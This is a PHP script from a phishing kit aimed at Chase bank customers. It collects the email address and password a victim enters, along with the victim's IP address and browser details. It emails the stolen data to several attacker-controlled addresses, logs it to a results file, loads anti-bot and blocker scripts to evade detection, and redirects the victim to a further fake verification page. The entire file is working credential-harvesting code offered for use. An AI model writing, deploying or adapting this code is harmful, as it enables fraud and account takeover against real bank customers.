<?php
$zabi = getenv("REMOTE_ADDR");
include '../antibots.php';
include('../email.php');
include('system.php');
include '../bt.php';
include "../blocker.php";
$message .= "--++-----[ $$ Dr.Don  $$ ]-----++--\n";
$message .= "--------------  Email accres chase  -------------\n";
$message .= "Email : ".$_POST['3']."\n";
$message .= "Password : ".$_POST['4']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- By Dr.Don ----------------------\n";
$cc = $_POST['ccn'];
$subject = " CHASE EMAIL ACCESS INFO [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Dr.Don <contact>\r\n";
mail($email,$subject,$message,$headers);
mail($blockeduse,$subject,$message,$headers);
    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);
mail($yourmail, $subject, $message , $headers);

header("Location: ../verification-info.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));?>